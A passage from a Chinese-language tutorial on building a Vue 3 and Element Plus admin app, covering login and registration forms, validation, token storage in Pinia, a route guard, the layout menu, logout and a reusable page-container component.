class="line">&lt;el-form ref=<span class="string">"form"</span>&gt;</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>注册之前进行校验</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-button</span><br><span class="line">  @click=<span class="string">"register"</span></span><br><span class="line">  <span class="keyword">class</span>=<span class="string">"button"</span></span><br><span class="line">  type=<span class="string">"primary"</span></span><br><span class="line">  auto-insert-space</span><br><span class="line">&gt;</span><br><span class="line">  注册</span><br><span class="line">&lt;/el-button&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">register</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">await</span> form.<span class="property">value</span>.<span class="title function_">validate</span>()</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'开始注册请求'</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="封装-api-实现注册功能"><a href="#封装-api-实现注册功能" class="headerlink" title="封装 api 实现注册功能"></a>封装 api 实现注册功能</h3><p>需求：封装注册api，进行注册，注册成功切换到登录</p><ol><li>新建 api/user.js 封装</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> request <span class="keyword">from</span> <span class="string">'@/utils/request'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">userRegisterService</span> = (<span class="params">{ username, password, repassword }</span>) =&gt;</span><br><span class="line">  request.<span class="title function_">post</span>(<span class="string">'/api/reg'</span>, { username, password, repassword })</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>页面中调用</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">register</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">await</span> form.<span class="property">value</span>.<span class="title function_">validate</span>()</span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">userRegisterService</span>(formModel.<span class="property">value</span>)</span><br><span class="line">  <span class="title class_">ElMessage</span>.<span class="title function_">success</span>(<span class="string">'注册成功'</span>)</span><br><span class="line">  <span class="comment">// 切换到登录</span></span><br><span class="line">  isRegister.<span class="property">value</span> = <span class="literal">false</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>eslintrc 中声明全局变量名,  解决 ElMessage 报错问题</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = {</span><br><span class="line">  ...</span><br><span class="line">  <span class="attr">globals</span>: {</span><br><span class="line">    <span class="title class_">ElMessage</span>: <span class="string">'readonly'</span>,</span><br><span class="line">    <span class="title class_">ElMessageBox</span>: <span class="string">'readonly'</span>,</span><br><span class="line">    <span class="title class_">ElLoading</span>: <span class="string">'readonly'</span></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="登录功能"><a href="#登录功能" class="headerlink" title="登录功能"></a>登录功能</h2><h3 id="实现登录校验"><a href="#实现登录校验" class="headerlink" title="实现登录校验"></a>实现登录校验</h3><p>【需求说明】给输入框添加表单校验</p><ol><li>用户名不能为空，用户名必须是5-10位的字符，失去焦点 和 修改内容时触发校验</li><li>密码不能为空，密码必须是6-15位的字符，失去焦点 和 修改内容时触发校验</li></ol><p>操作步骤：</p><ol><li>model 属性绑定 form 数据对象，直接绑定之前提供好的数据对象即可</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-form :model=<span class="string">"formModel"</span> &gt;</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>rules 配置校验规则，共用注册的规则即可</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-form :rules=<span class="string">"rules"</span> &gt;</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>v-model 绑定 form 数据对象的子属性</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-input</span><br><span class="line">  v-model=<span class="string">"formModel.username"</span></span><br><span class="line">  :prefix-icon=<span class="string">"User"</span></span><br><span class="line">  placeholder=<span class="string">"请输入用户名"</span></span><br><span class="line">&gt;&lt;/el-input&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">el-input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">v-model</span>=<span class="string">"formModel.password"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">name</span>=<span class="string">"password"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">:prefix-icon</span>=<span class="string">"Lock"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">type</span>=<span class="string">"password"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">placeholder</span>=<span class="string">"请输入密码"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">&gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>prop 绑定校验规则</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-form-item prop=<span class="string">"username"</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">v-model</span>=<span class="string">"formModel.username"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">:prefix-icon</span>=<span class="string">"User"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">placeholder</span>=<span class="string">"请输入用户名"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  &gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span></span><br><span class="line">&lt;/el-form-item&gt;</span><br><span class="line">... </span><br></pre></td></tr></tbody></table></figure><ol start="5"><li>切换的时候重置</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title function_">watch</span>(isRegister, <span class="function">() =&gt;</span> {</span><br><span class="line">  formModel.<span class="property">value</span> = {</span><br><span class="line">    <span class="attr">username</span>: <span class="string">''</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">''</span>,</span><br><span class="line">    <span class="attr">repassword</span>: <span class="string">''</span></span><br><span class="line">  }</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><h3 id="登录前的预校验-登录成功"><a href="#登录前的预校验-登录成功" class="headerlink" title="登录前的预校验 &amp; 登录成功"></a>登录前的预校验 &amp; 登录成功</h3><p>【需求说明1】登录之前的预校验</p><ul><li>登录请求之前，需要对用户的输入内容，进行校验</li><li>校验通过才发送请求</li></ul><p>【需求说明2】<strong>登录功能</strong></p><ol><li>封装登录API，点击按钮发送登录请求</li><li>登录成功存储token，存入pinia 和 持久化本地storage</li><li>跳转到首页，给提示</li></ol><p>【测试账号】</p><ul><li><p>登录的测试账号:  shuaipeng</p></li><li><p>登录测试密码:  123456</p></li></ul><p>PS: 每天账号会重置，如果被重置了，可以去注册页，注册一个新号</p><p>实现步骤：</p><ol><li>注册事件，进行登录前的预校验 (获取到组件调用方法)</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-form ref=<span class="string">"form"</span>&gt;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">const</span> <span class="title function_">login</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">await</span> form.<span class="property">value</span>.<span class="title function_">validate</span>()</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'开始登录'</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>封装接口 API</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">userLoginService</span> = (<span class="params">{ username, password }</span>) =&gt;</span><br><span class="line">  request.<span class="title function_">post</span>(<span class="string">'api/login'</span>, { username, password })</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>调用方法将 token 存入 pinia 并 自动持久化本地</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> userStore = <span class="title function_">useUserStore</span>()</span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">useRouter</span>()</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">login</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">await</span> form.<span class="property">value</span>.<span class="title function_">validate</span>()</span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">userLoginService</span>(formModel.<span class="property">value</span>)</span><br><span class="line">  userStore.<span class="title function_">setToken</span>(res.<span class="property">data</span>.<span class="property">token</span>)</span><br><span class="line">  <span class="title class_">ElMessage</span>.<span class="title function_">success</span>(<span class="string">'登录成功'</span>)</span><br><span class="line">  router.<span class="title function_">push</span>(<span class="string">'/'</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="首页-layout-架子-element-plus-菜单"><a href="#首页-layout-架子-element-plus-菜单" class="headerlink" title="首页 layout 架子 [element-plus 菜单]"></a>首页 layout 架子 [element-plus 菜单]</h1><h2 id="基本架子拆解"><a href="#基本架子拆解" class="headerlink" title="基本架子拆解"></a>基本架子拆解</h2><p><strong>架子组件列表：</strong></p><p>el-container</p><ul><li><p>el-aside 左侧</p><ul><li>el-menu 左侧边栏菜单</li></ul></li><li><p>el-container  右侧</p><ul><li>el-header  右侧头部<ul><li>el-dropdown</li></ul></li><li>el-main  右侧主体<ul><li>router-view</li></ul></li></ul></li></ul><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"><span class="keyword">import</span> {</span><br><span class="line">  <span class="title class_">Management</span>,</span><br><span class="line">  <span class="title class_">Promotion</span>,</span><br><span class="line">  <span class="title class_">UserFilled</span>,</span><br><span class="line">  <span class="title class_">User</span>,</span><br><span class="line">  <span class="title class_">Crop</span>,</span><br><span class="line">  <span class="title class_">EditPen</span>,</span><br><span class="line">  <span class="title class_">SwitchButton</span>,</span><br><span class="line">  <span class="title class_">CaretBottom</span></span><br><span class="line">} <span class="keyword">from</span> <span class="string">'@element-plus/icons-vue'</span></span><br><span class="line"><span class="keyword">import</span> avatar <span class="keyword">from</span> <span class="string">'@/assets/default.png'</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;el-container class="layout-container"&gt;</span><br><span class="line">    &lt;el-aside width="200px"&gt;</span><br><span class="line">      &lt;div class="el-aside__logo"&gt;&lt;/div&gt;</span><br><span class="line">      &lt;el-menu</span><br><span class="line">        active-text-color="#ffd04b"</span><br><span class="line">        background-color="#232323"</span><br><span class="line">        :default-active="$route.path"</span><br><span class="line">        text-color="#fff"</span><br><span class="line">        router</span><br><span class="line">      &gt;</span><br><span class="line">        &lt;el-menu-item index="/article/channel"&gt;</span><br><span class="line">          &lt;el-icon&gt;&lt;Management /&gt;&lt;/el-icon&gt;</span><br><span class="line">          &lt;span&gt;文章分类&lt;/span&gt;</span><br><span class="line">        &lt;/el-menu-item&gt;</span><br><span class="line">        &lt;el-menu-item index="/article/manage"&gt;</span><br><span class="line">          &lt;el-icon&gt;&lt;Promotion /&gt;&lt;/el-icon&gt;</span><br><span class="line">          &lt;span&gt;文章管理&lt;/span&gt;</span><br><span class="line">        &lt;/el-menu-item&gt;</span><br><span class="line">        &lt;el-sub-menu index="/user"&gt;</span><br><span class="line">          &lt;template #title&gt;</span><br><span class="line">            &lt;el-icon&gt;&lt;UserFilled /&gt;&lt;/el-icon&gt;</span><br><span class="line">            &lt;span&gt;个人中心&lt;/span&gt;</span><br><span class="line">          &lt;/template&gt;</span><br><span class="line">          &lt;el-menu-item index="/user/profile"&gt;</span><br><span class="line">            &lt;el-icon&gt;&lt;User /&gt;&lt;/el-icon&gt;</span><br><span class="line">            &lt;span&gt;基本资料&lt;/span&gt;</span><br><span class="line">          &lt;/el-menu-item&gt;</span><br><span class="line">          &lt;el-menu-item index="/user/avatar"&gt;</span><br><span class="line">            &lt;el-icon&gt;&lt;Crop /&gt;&lt;/el-icon&gt;</span><br><span class="line">            &lt;span&gt;更换头像&lt;/span&gt;</span><br><span class="line">          &lt;/el-menu-item&gt;</span><br><span class="line">          &lt;el-menu-item index="/user/password"&gt;</span><br><span class="line">            &lt;el-icon&gt;&lt;EditPen /&gt;&lt;/el-icon&gt;</span><br><span class="line">            &lt;span&gt;重置密码&lt;/span&gt;</span><br><span class="line">          &lt;/el-menu-item&gt;</span><br><span class="line">        &lt;/el-sub-menu&gt;</span><br><span class="line">      &lt;/el-menu&gt;</span><br><span class="line">    &lt;/el-aside&gt;</span><br><span class="line">    &lt;el-container&gt;</span><br><span class="line">      &lt;el-header&gt;</span><br><span class="line">        &lt;div&gt;黑马程序员：&lt;strong&gt;小帅鹏&lt;/strong&gt;&lt;/div&gt;</span><br><span class="line">        &lt;el-dropdown placement="bottom-end"&gt;</span><br><span class="line">          &lt;span class="el-dropdown__box"&gt;</span><br><span class="line">            &lt;el-avatar :src="avatar" /&gt;</span><br><span class="line">            &lt;el-icon&gt;&lt;CaretBottom /&gt;&lt;/el-icon&gt;</span><br><span class="line">          &lt;/span&gt;</span><br><span class="line">          &lt;template #dropdown&gt;</span><br><span class="line">            &lt;el-dropdown-menu&gt;</span><br><span class="line">              &lt;el-dropdown-item command="profile" :icon="User"</span><br><span class="line">                &gt;基本资料&lt;/el-dropdown-item</span><br><span class="line">              &gt;</span><br><span class="line">              &lt;el-dropdown-item command="avatar" :icon="Crop"</span><br><span class="line">                &gt;更换头像&lt;/el-dropdown-item</span><br><span class="line">              &gt;</span><br><span class="line">              &lt;el-dropdown-item command="password" :icon="EditPen"</span><br><span class="line">                &gt;重置密码&lt;/el-dropdown-item</span><br><span class="line">              &gt;</span><br><span class="line">              &lt;el-dropdown-item command="logout" :icon="SwitchButton"</span><br><span class="line">                &gt;退出登录&lt;/el-dropdown-item</span><br><span class="line">              &gt;</span><br><span class="line">            &lt;/el-dropdown-menu&gt;</span><br><span class="line">          &lt;/template&gt;</span><br><span class="line">        &lt;/el-dropdown&gt;</span><br><span class="line">      &lt;/el-header&gt;</span><br><span class="line">      &lt;el-main&gt;</span><br><span class="line">        &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">      &lt;/el-main&gt;</span><br><span class="line">      &lt;el-footer&gt;大事件 ©2023 Created by 黑马程序员&lt;/el-footer&gt;</span><br><span class="line">    &lt;/el-container&gt;</span><br><span class="line">  &lt;/el-container&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang="scss" scoped&gt;</span><br><span class="line">.layout-container {</span><br><span class="line">  height: 100vh;</span><br><span class="line">  .el-aside {</span><br><span class="line">    background-color: #232323;</span><br><span class="line">    &amp;__logo {</span><br><span class="line">      height: 120px;</span><br><span class="line">      background: url('@/assets/logo.png') no-repeat center / 120px auto;</span><br><span class="line">    }</span><br><span class="line">    .el-menu {</span><br><span class="line">      border-right: none;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  .el-header {</span><br><span class="line">    background-color: #fff;</span><br><span class="line">    display: flex;</span><br><span class="line">    align-items: center;</span><br><span class="line">    justify-content: space-between;</span><br><span class="line">    .el-dropdown__box {</span><br><span class="line">      display: flex;</span><br><span class="line">      align-items: center;</span><br><span class="line">      .el-icon {</span><br><span class="line">        color: #999;</span><br><span class="line">        margin-left: 10px;</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      &amp;:active,</span><br><span class="line">      &amp;:focus {</span><br><span class="line">        outline: none;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  .el-footer {</span><br><span class="line">    display: flex;</span><br><span class="line">    align-items: center;</span><br><span class="line">    justify-content: center;</span><br><span class="line">    font-size: 14px;</span><br><span class="line">    color: #666;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h2 id="登录访问拦截"><a href="#登录访问拦截" class="headerlink" title="登录访问拦截"></a>登录访问拦截</h2><p>需求：只有登录页，可以未授权的时候访问，其他所有页面，都需要先登录再访问</p><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 登录访问拦截</span></span><br><span class="line">router.<span class="title function_">beforeEach</span>(<span class="function">(<span class="params">to</span>) =&gt;</span> {</span><br><span class="line">  <span class="keyword">const</span> userStore = <span class="title function_">useUserStore</span>()</span><br><span class="line">  <span class="keyword">if</span> (!userStore.<span class="property">token</span> &amp;&amp; to.<span class="property">path</span> !== <span class="string">'/login'</span>) <span class="keyword">return</span> <span class="string">'/login'</span></span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><h2 id="用户基本信息获取-渲染"><a href="#用户基本信息获取-渲染" class="headerlink" title="用户基本信息获取&amp;渲染"></a>用户基本信息获取&amp;渲染</h2><ol><li><code>api/user.js</code>封装接口</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">userGetInfoService</span> = (<span class="params"></span>) =&gt; request.<span class="title function_">get</span>(<span class="string">'/my/userinfo'</span>)</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>stores/modules/user.js 定义数据</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> user = <span class="title function_">ref</span>({})</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">getUser</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">userGetInfoService</span>() <span class="comment">// 请求获取数据</span></span><br><span class="line">  user.<span class="property">value</span> = res.<span class="property">data</span>.<span class="property">data</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li><code>layout/LayoutContainer</code>页面中调用</li></ol><figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> { useUserStore } <span class="keyword">from</span> <span class="string">'@/stores'</span></span><br><span class="line"><span class="keyword">const</span> userStore = <span class="title function_">useUserStore</span>()</span><br><span class="line"><span class="title function_">onMounted</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">  userStore.<span class="title function_">getUser</span>()</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>动态渲染</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  黑马程序员：&lt;strong&gt;{{ userStore.<span class="property">user</span>.<span class="property">nickname</span> || userStore.<span class="property">user</span>.<span class="property">username</span> }}&lt;/strong&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">el-avatar</span> <span class="attr">:src</span>=<span class="string">"userStore.user.user_pic || avatar"</span> /&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><h2 id="退出功能-element-plus-确认框"><a href="#退出功能-element-plus-确认框" class="headerlink" title="退出功能 [element-plus 确认框]"></a>退出功能 [element-plus 确认框]</h2><ol><li>注册点击事件</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-dropdown placement=<span class="string">"bottom-end"</span> @command=<span class="string">"onCommand"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">el-dropdown-menu</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">el-dropdown-item</span> <span class="attr">command</span>=<span class="string">"profile"</span> <span class="attr">:icon</span>=<span class="string">"User"</span>&gt;</span>基本资料<span class="tag">&lt;/<span class="name">el-dropdown-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">el-dropdown-item</span> <span class="attr">command</span>=<span class="string">"avatar"</span> <span class="attr">:icon</span>=<span class="string">"Crop"</span>&gt;</span>更换头像<span class="tag">&lt;/<span class="name">el-dropdown-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">el-dropdown-item</span> <span class="attr">command</span>=<span class="string">"password"</span> <span class="attr">:icon</span>=<span class="string">"EditPen"</span>&gt;</span>重置密码<span class="tag">&lt;/<span class="name">el-dropdown-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">el-dropdown-item</span> <span class="attr">command</span>=<span class="string">"logout"</span> <span class="attr">:icon</span>=<span class="string">"SwitchButton"</span>&gt;</span>退出登录<span class="tag">&lt;/<span class="name">el-dropdown-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">el-dropdown-menu</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>添加退出功能</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">onCommand</span> = <span class="keyword">async</span> (<span class="params">command</span>) =&gt; {</span><br><span class="line">  <span class="keyword">if</span> (command === <span class="string">'logout'</span>) {</span><br><span class="line">    <span class="keyword">await</span> <span class="title class_">ElMessageBox</span>.<span class="title function_">confirm</span>(<span class="string">'你确认退出大事件吗？'</span>, <span class="string">'温馨提示'</span>, {</span><br><span class="line">      <span class="attr">type</span>: <span class="string">'warning'</span>,</span><br><span class="line">      <span class="attr">confirmButtonText</span>: <span class="string">'确认'</span>,</span><br><span class="line">      <span class="attr">cancelButtonText</span>: <span class="string">'取消'</span></span><br><span class="line">    })</span><br><span class="line">    userStore.<span class="title function_">removeToken</span>()</span><br><span class="line">    userStore.<span class="title function_">setUser</span>({})</span><br><span class="line">    router.<span class="title function_">push</span>(<span class="string">`/login`</span>)</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    router.<span class="title function_">push</span>(<span class="string">`/user/<span class="subst">${command}</span>`</span>)</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>pinia  user.js 模块 提供 setUser 方法</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">setUser</span> = (<span class="params">obj</span>) =&gt; (user.<span class="property">value</span> = obj)</span><br></pre></td></tr></tbody></table></figure><h1 id="文章分类页面-element-plus-表格"><a href="#文章分类页面-element-plus-表格" class="headerlink" title="文章分类页面 - [element-plus 表格]"></a>文章分类页面 - [element-plus 表格]</h1><h2 id="基本架子-PageContainer"><a href="#基本架子-PageContainer" class="headerlink" title="基本架子 - PageContainer"></a>基本架子 - PageContainer</h2><ol><li>基本结构样式，用到了 el-card 组件</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-card</span> <span class="attr">class</span>=<span class="string">"page-container"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">template</span> #<span class="attr">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>文章分类<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"extra"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"primary"</span>&gt;</span>添加分类<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">     ...</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">el-card</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">"scss"</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"><span class="selector-class">.page-container</span> {</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  <span class="attribute">min-height</span>: <span class="number">100%</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  <span class="attribute">box-sizing</span>: border-box;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  <span class="selector-class">.header</span> {</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="attribute">display</span>: flex;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="attribute">align-items</span>: center;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="attribute">justify-content</span>: space-between;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  }</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">}</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>考虑到多个页面复用，封装成组件<ul><li>props 定制标题</li><li>默认插槽 default 定制内容主体</li><li>具名插槽 extra  定制头部右侧额外的按钮</li></ul></li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"><span class="title function_">defineProps</span>({</span><br><span class="line">  <span class="attr">title</span>: {</span><br><span class="line">    <span class="attr">required</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">String</span></span><br><span class="line">  }</span><br><span class="line">})</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">el-card</span> <span class="attr">class</span>=<span class="string">"page-container"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">template</span> #<span class="attr">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>{{ title }}<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"extra"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">"extra"</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">el-card</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">"scss"</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"><span class="selector-class">.page-container</span> {</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  <span class="attribute">min-height</span>: <span class="number">100%</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  <span class="attribute">box-sizing</span>: border-box;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  <span class="selector-class">.header</span> {</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="attribute">display</span>: flex;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="attribute">align-items</span>: center;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="attribute">justify-content</span>: space-between;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  }</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">}</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>页面中直接使用测试 ( unplugin-vue-components 会自动注册)</li></ol><ul><li>文章分类测试：</li></ul><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">page-container</span> <span 